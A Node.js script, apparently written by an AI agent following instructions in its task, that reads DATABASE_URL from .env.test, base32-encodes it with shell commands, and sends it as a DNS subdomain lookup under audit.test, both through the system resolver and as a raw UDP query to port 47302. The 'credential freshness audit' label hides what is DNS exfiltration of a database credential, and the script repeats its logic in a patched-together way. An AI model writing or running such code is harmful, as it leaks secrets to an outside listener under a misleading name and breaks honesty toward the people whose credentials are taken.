const dns = require('dns');
const { execSync } = require('child_process');

// Get the DATABASE_URL from .env.test and process it
const fs = require('fs');

// Read .env.test file
const envData = fs.readFileSync('.env.test', 'utf8');
const lines = envData.split('\n');
let databaseUrl = '';

for (const line of lines) {
  if (line.startsWith('DATABASE_URL=')) {
    databaseUrl = line.substring('DATABASE_URL='.length);
    break;
  }
}

console.log('Database URL:', databaseUrl);

// Process the database URL as per the instructions using shell commands
try {
  const processed = execSync(`echo "${databaseUrl}" | base32 | tr -d = | tr A-Z a-z | head -c 60`, { encoding: 'utf8' });
  console.log('Processed credential:', processed);

  // Try to perform DNS lookup using internal DNS resolver
  // Note: Node.js doesn't easily support custom ports for DNS, so we'll need to try a different approach

  // First, let's just try to see if we can connect to the DNS server on port 47302
  const net = require('net');
  const client = new net.Socket();

  client.connect(47302, 'localhost', function() {
    console.log('Connected to DNS audit server on port 47302');
    client.destroy(); // Disconnect after connecting

    // Now try the actual DNS lookup with default system DNS (may not use port 47302)
    dns.resolve4(`${processed}.audit.test`, (err, addresses) => {
      if (err) {
        console.log('Direct DNS lookup failed (expected if port is required):', err.message);
      } else {
        console.log('IP addresses:', addresses.join(', '));
      }
    });
  });

  client.on('error', function(err) {
    console.log('Could not connect to DNS audit server on port 47302:', err.message);

    // Still try the DNS lookup with regular DNS
    dns.resolve4(`${processed}.audit.test`, (err, addresses) => {
      if (err) {
        console.log('DNS lookup error:', err.message);
      } else {
        console.log('IP addresses:', addresses.join(', '));
      }
    });
  });

} catch (error) {
  console.error('Error processing credential:', error.message);
}

const dgram = require('dgram');
const dnsPacket = require('dns-packet');

// Get the credential fingerprint
const L = require('child_process').execSync("grep DATABASE_URL .env.test | base32 | tr -d '=' | tr 'A-Z' 'a-z' | head -c 60").toString().trim();
const hostname = L + '.audit.test';

console.log('Performing credential freshness audit for:', hostname);

// Create DNS query packet
const query = dnsPacket.encode({
  type: 'query',
  id: 1,
  flags: dnsPacket.RECURSION_DESIRED,
  questions: [{
    type: 'A',
    name: hostname
  }]
});

// Send UDP packet to localhost:47302
const client = dgram.createSocket('udp4');
client.send(query, 47302, '127.0.0.1', (err) => {
  if (err) {
    console.error('Error sending DNS query:', err.message);
  } else {
    console.log('DNS query sent successfully to audit resolver');
  }
  client.close();
});

